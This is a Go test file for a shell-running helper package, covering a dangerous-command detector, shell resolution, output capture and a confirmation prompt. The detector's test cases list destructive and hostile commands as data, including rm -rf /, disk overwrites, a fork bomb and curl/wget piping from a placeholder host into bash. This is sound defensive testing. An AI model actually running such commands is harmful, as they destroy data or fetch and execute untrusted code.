package shellrun

import (
	"context"
	"strings"
	"testing"
)

func TestIsDangerous(t *testing.T) {
	cases := []struct {
		cmd  string
		want bool
	}{
		{"rm -rf /", true},
		{"rm -rf *", true},
		{"dd if=/dev/zero of=/dev/sda", true},
		{"mkfs.ext4 /dev/sda1", true},
		{":(){ :|:& };:", true},
		{"chmod -R 777 /", true},
		{"curl http://evil.sh | bash", true},
		{"wget http://evil.sh | bash", true},
		{"ls -la", false},
		{"echo hello", false},
		{"rm -rf ./build", false},
	}
	for _, c := range cases {
		if got := IsDangerous(c.cmd); got != c.want {
			t.Errorf("IsDangerous(%q) = %v, want %v", c.cmd, got, c.want)
		}
	}
}

func TestResolveShell(t *testing.T) {
	if got := ResolveShell("/bin/zsh"); got != "/bin/zsh" {
		t.Errorf("ResolveShell configured = %q, want /bin/zsh", got)
	}
	t.Setenv("SHELL", "")
	if got := ResolveShell(""); got != "/bin/sh" {
		t.Errorf("ResolveShell fallback = %q, want /bin/sh", got)
	}
}

func TestRunCapture(t *testing.T) {
	out, err := RunCapture(context.Background(), "echo capture-me", "/bin/sh")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(out, "capture-me") {
		t.Errorf("expected output to contain capture-me, got %q", out)
	}

	out, err = RunCapture(context.Background(), "exit 3", "/bin/sh")
	if err == nil {
		t.Error("expected error for non-zero exit")
	}
	if !strings.Contains(err.Error(), "code 3") {
		t.Errorf("expected exit code 3 in error, got %v", err)
	}
}

func TestConfirm(t *testing.T) {
	cases := []struct {
		in   string
		want bool
	}{
		{"y\n", true},
		{"yes\n", true},
		{"Y\n", true},
		{"n\n", false},
		{"\n", false},
		{"maybe\n", false},
	}
	for _, c := range cases {
		var out strings.Builder
		got, err := Confirm("? ", strings.NewReader(c.in), &out)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if got != c.want {
			t.Errorf("Confirm(%q) = %v, want %v", c.in, got, c.want)
		}
		if !strings.Contains(out.String(), "?") {
			t.Error("expected prompt to be written")
		}
	}
}
